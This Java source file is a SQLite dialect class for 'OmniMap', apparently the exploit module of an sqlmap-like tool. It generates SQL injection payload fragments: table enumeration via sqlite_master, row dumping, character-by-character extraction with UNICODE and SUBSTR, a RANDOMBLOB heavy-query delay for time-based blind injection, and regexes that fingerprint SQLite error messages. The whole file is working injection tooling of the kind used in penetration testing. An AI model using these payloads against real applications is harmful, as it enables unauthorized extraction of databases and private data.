package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * SQLite dialect for OmniMap.
 * Uses sqlite_master, SUBSTR(), CHAR(), heavy-query delay (no native SLEEP),
 * CASE WHEN for conditionals. No error-based extraction available.
 */
public class SqliteDialect implements DbmsDialect {

    @Override
    public String getName() { return "SQLite"; }

    @Override
    public String currentDatabase() {
        // SQLite doesn't have a database() function; use a constant
        return "SELECT 'main'";
    }

    @Override
    public String listDatabases() {
        // SQLite only has one database per file
        return "SELECT 'main'";
    }

    @Override
    public String listTables(String database) {
        return "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT name FROM pragma_table_info('" + table + "')";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "IFNULL(CAST(\"" + c + "\" AS TEXT),CHAR(32))")
                .collect(Collectors.joining("||CHAR(124)||"));
        return "SELECT " + cols + " FROM \"" + table + "\" LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTR((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String asciiAtPosition(String expr, int pos) {
        // SQLite uses UNICODE() instead of ASCII(). ASCII() doesn't exist in SQLite.
        return "UNICODE(" + substringFunction(expr, pos, 1) + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        // SQLite has no native sleep; use heavy RANDOMBLOB computation
        // sqlmap format: LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
        return "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + seconds + "00000000/2))))";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // SQLite doesn't have useful error-based extraction functions
        return List.of();
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap uses [SLEEPTIME]00000000/2 (e.g., 5 → 500000000/2)
        return "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + seconds + "00000000/2))))";
    }

    /** Pre-compiled error patterns — sqlmap errors.xml + ORM/framework patterns */
    private static final List<Pattern> ERROR_PATTERNS = List.of(
            // === sqlmap core patterns (errors.xml) ===
            Pattern.compile("SQLite/JDBCDriver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLite\\.Exception", Pattern.CASE_INSENSITIVE),
            Pattern.compile("(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Warning.*?\\W(sqlite_|SQLite3::)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\\[SQLITE_ERROR\\]", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLite error \\d+:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlite3\\.OperationalError:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLite3::SQLException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.sqlite\\.JDBC", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Pdo[./_\\\\]Sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLiteException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SqliteError:", Pattern.CASE_INSENSITIVE),
            // === Native SQLite errors ===
            Pattern.compile("SQLITE_ERROR", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_CONSTRAINT", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_MISMATCH", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_RANGE", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_BUSY", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_LOCKED", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLITE_CORRUPT", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQLite3::BusyException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlite3\\.ProgrammingError", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlite3\\.IntegrityError", Pattern.CASE_INSENSITIVE),
            Pattern.compile("near \".*?\": syntax error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("unrecognized token:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("no such table:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("no such column:", Pattern.CASE_INSENSITIVE),
            Pattern.compile("table .*? already exists", Pattern.CASE_INSENSITIVE),
            Pattern.compile("UNIQUE constraint failed", Pattern.CASE_INSENSITIVE),
            Pattern.compile("NOT NULL constraint failed", Pattern.CASE_INSENSITIVE),
            Pattern.compile("CHECK constraint failed", Pattern.CASE_INSENSITIVE),
            Pattern.compile("datatype mismatch", Pattern.CASE_INSENSITIVE),
            Pattern.compile("incomplete input", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SELECTs to the left and right of UNION do not have the same number", Pattern.CASE_INSENSITIVE),
            Pattern.compile("FOREIGN KEY constraint failed", Pattern.CASE_INSENSITIVE),
            Pattern.compile("unable to open database file", Pattern.CASE_INSENSITIVE),
            Pattern.compile("database is locked", Pattern.CASE_INSENSITIVE),
            Pattern.compile("database disk image is malformed", Pattern.CASE_INSENSITIVE),
            // === ORM / framework patterns ===
            Pattern.compile("Microsoft\\.Data\\.Sqlite\\.SqliteException", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Sequel::DatabaseError.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ActiveRecord::StatementInvalid.*?SQLite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("django\\.db\\.utils\\.OperationalError.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlalchemy\\.exc\\.OperationalError.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("knex.*?error.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SequelizeDatabaseError.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("TypeORMError.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("prisma.*?error.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("better-sqlite3.*?Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("rusqlite::Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Illuminate\\\\Database\\\\QueryException.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Doctrine\\\\DBAL\\\\Exception.*?sqlite", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DBD::SQLite", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public List<Pattern> errorPatterns() {
        return ERROR_PATTERNS;
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + table + "\"";
    }
}
